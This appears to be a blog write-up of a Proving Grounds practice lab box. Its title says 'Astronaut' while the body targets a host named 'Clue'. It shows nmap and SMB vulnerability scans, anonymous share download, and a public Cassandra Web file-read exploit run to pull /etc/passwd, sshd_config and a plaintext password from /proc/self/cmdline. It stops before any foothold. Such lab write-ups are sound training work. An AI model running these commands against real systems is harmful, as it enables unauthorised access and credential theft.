---
layout: post
title:  "Write Up: Proving Grounds Practice - Astronaut"
date:   2024-07-26 16:32:31 -0400
categories: oscp proving-grounds
---

192.168.199.240
me - 192.168.45.213

```
┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ sudo nmap -sV -sC -p- -oA Clue 192.168.169.240
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http             Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
|_http-server-header: thin
|_http-title: Cassandra Web
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
Service Info: Hosts: 127.0.0.1, CLUE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 1h19m17s, deviation: 2h18m35s, median: -43s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-07-25T18:43:52-04:00
| smb2-time: 
|   date: 2024-07-25T22:43:55
|_  start_date: N/A
```


looks like port 80 is a no-go currently (getting a 403 response) so we are going to table that for now. Also seeing Samba which could be fun but going to put a pin in that for now and try out http://192.168.199.240:3000/

```
nmap -v -p 139,445 --script smb-os-discovery 192.168.199.240

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:54 EDT
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Initiating Ping Scan at 14:54
Scanning 192.168.199.240 [2 ports]
Completed Ping Scan at 14:54, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:54
Completed Parallel DNS resolution of 1 host. at 14:54, 13.00s elapsed
Initiating Connect Scan at 14:54
Scanning 192.168.199.240 [2 ports]
Discovered open port 445/tcp on 192.168.199.240
Discovered open port 139/tcp on 192.168.199.240
Completed Connect Scan at 14:54, 0.04s elapsed (2 total ports)
NSE: Script scanning 192.168.199.240.
Initiating NSE at 14:54
Completed NSE at 14:54, 2.38s elapsed
Nmap scan report for 192.168.199.240
Host is up (0.039s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: clue
|   NetBIOS computer name: CLUE\x00
|   Domain name: pg
|   FQDN: clue.pg
|_  System time: 2024-07-26T14:54:05-04:00

NSE: Script Post-scanning.
Initiating NSE at 14:54
Completed NSE at 14:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
```

checking for vuln
```
└─$  nmap -p 139,445 --script smb-vuln* 192.168.199.240
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-26 14:57 EDT
Nmap scan report for 192.168.199.240
Host is up (0.040s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false

Nmap done: 1 IP address (1 host up) scanned in 59.08 seconds
```

```
└─$ smbclient --no-pass -L //192.168.199.240

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        backup          Disk      Backup web directory shares
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
```


```
smbclient --no-pass //<IP>/<Folder>
```


```
smbget --recursive smb://192.168.199.240/backup
```

Downloaded backup, there is a ton of stuff in there, putting a pin in it for now


========================================================================================================================
┌──(kali㉿kali)-[~/…/smb-dl/freeswitch/etc/freeswitch]
└─$ searchsploit cassandra   
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Atrium Software Cassandra NNTP Server 1.10 - Buffer Overflow                      | windows/dos/19884.txt
Cassandra Web 0.5.0 - Remote File Read                                            | linux/webapps/49362.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


└─$ searchsploit -m 49362.py
  Exploit: Cassandra Web 0.5.0 - Remote File Read
      URL: https://www.exploit-db.com/exploits/49362
     Path: /usr/share/exploitdb/exploits/linux/webapps/49362.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/offsec/pg-practice/Clue/49362.py



┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ python3 exploit.py 192.168.199.240 /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash



┌──(kali㉿kali)-[~/offsec/pg-practice/Clue]
└─$ python3 exploit.py 192.168.199.240 /proc/self/cmdline
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330

cassie
SecondBiteTheApple330



└─$ python3 exploit.py 192.168.199.240 /etc/ssh/sshd_config

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
X11Forwarding yes
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
PrintMotd no
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

# override default of no subsystems
Subsystem       sftp    /usr/lib/openssh/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

AllowUsers root anthony


can't ssh in, only root and anothony soooooo.................

==========================================================================================================================

http://192.168.199.240:8021/
